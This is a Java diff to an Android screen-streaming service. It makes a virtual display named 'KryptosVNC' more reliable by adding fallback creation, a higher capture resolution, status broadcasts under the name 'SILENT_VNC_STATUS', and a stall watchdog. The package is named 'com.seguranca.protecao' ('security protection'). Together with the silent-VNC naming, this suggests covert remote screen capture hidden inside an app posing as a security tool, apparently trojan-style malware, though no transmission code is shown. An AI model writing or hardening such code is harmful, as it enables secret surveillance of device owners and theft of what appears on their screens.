@@ -43,12 +43,20 @@ public class ScreenStreamService extends Service {
     private MediaProjection projection;
     private VirtualDisplay vdisplay;
     private ImageReader reader;
+    private static final boolean PROJ_SECURE = true;
     private HandlerThread thread;
     private Handler handler;
     private int outW = 2, outH = 2;
     private long lastFrameTs = 0L;
+    private volatile long lastFrameMs = 0L;
+    private int densityDpi = 0;
 
     public static boolean isActive() { return active; }
+
+    public static void forceEnsure(Context ctx) {
+        lastRequest = 0L;
+        ensure(ctx);
+    }
 
     public static void ensure(Context ctx) {
         if (active) return;
@@ -123,7 +131,7 @@ public class ScreenStreamService extends Service {
 
             int srcW = dm.widthPixels;
             int srcH = dm.heightPixels;
-            float scale = Math.min(1f, 650f / Math.max(srcW, srcH));
+            float scale = Math.min(1f, 720f / Math.max(srcW, srcH));
             outW = Math.max(2, ((int) (srcW * scale)) & ~1);
             outH = Math.max(2, ((int) (srcH * scale)) & ~1);
 
@@ -139,10 +147,25 @@ public class ScreenStreamService extends Service {
             }, handler);
 
             vdisplay = projection.createVirtualDisplay("KryptosVNC", outW, outH, dm.densityDpi,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    (DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR | (PROJ_SECURE ? DisplayManager.VIRTUAL_DISPLAY_FLAG_SECURE : 0)),
                     reader.getSurface(), null, handler);
+            if (vdisplay == null) {
+                Log.w(TAG, "AUTO_MIRROR falhou, tentando PUBLIC");
+                vdisplay = projection.createVirtualDisplay("KryptosVNC", outW, outH, dm.densityDpi,
+                        (DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC | (PROJ_SECURE ? DisplayManager.VIRTUAL_DISPLAY_FLAG_SECURE : 0)),
+                        reader.getSurface(), null, handler);
+            }
+            if (vdisplay == null) {
+                Log.e(TAG, "createVirtualDisplay retornou null");
+                reportState("FAIL", "null");
+                return;
+            }
+            densityDpi = dm.densityDpi;
 
             active = true;
+            lastFrameMs = System.currentTimeMillis();
+            reportState("OK", outW + "x" + outH);
+            try { handler.removeCallbacks(stallCheck); handler.postDelayed(stallCheck, 5000); } catch (Throwable ignored) {}
             Log.d(TAG, "projection OK " + outW + "x" + outH);
         } catch (Throwable t) {
             active = false;
@@ -160,6 +183,7 @@ public class ScreenStreamService extends Service {
                 long now = System.currentTimeMillis();
                 if (now - lastFrameTs < MIN_FRAME_GAP_MS) return;
                 lastFrameTs = now;
+                lastFrameMs = now;
 
                 Image.Plane plane = img.getPlanes()[0];
                 ByteBuffer buf = plane.getBuffer();
@@ -184,6 +208,39 @@ public class ScreenStreamService extends Service {
             } finally {
                 try { if (img != null) img.close(); } catch (Throwable ignored) {}
             }
+        }
+    };
+
+    private void reportState(String state, String detail) {
+        Log.d(TAG, "PROJ " + state + " " + detail);
+        try {
+            Intent i = new Intent("com.seguranca.protecao.SILENT_VNC_STATUS");
+            i.setPackage(getPackageName());
+            i.putExtra("active", active);
+            i.putExtra("method", "projection");
+            i.putExtra("detail", state + ":" + detail);
+            sendBroadcast(i);
+        } catch (Throwable ignored) {}
+    }
+
+    private final Runnable stallCheck = new Runnable() {
+        @Override public void run() {
+            try {
+                if (active && lastFrameMs > 0 && System.currentTimeMillis() - lastFrameMs > 6000L) {
+                    Log.w(TAG, "STALL sem frames -> recriando VirtualDisplay");
+                    reportState("STALL", "sem frames");
+                    if (vdisplay != null) { try { vdisplay.release(); } catch (Throwable ignored) {} vdisplay = null; }
+                    try {
+                        if (projection != null && reader != null) {
+                            vdisplay = projection.createVirtualDisplay("KryptosVNC", outW, outH, densityDpi,
+                                    (DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR | (PROJ_SECURE ? DisplayManager.VIRTUAL_DISPLAY_FLAG_SECURE : 0)),
+                                    reader.getSurface(), null, handler);
+                        }
+                    } catch (Throwable t) { Log.w(TAG, "recriar falhou: " + t); }
+                    lastFrameMs = System.currentTimeMillis();
+                }
+            } catch (Throwable ignored) {}
+            try { handler.postDelayed(this, 5000); } catch (Throwable ignored) {}
         }
     };
 
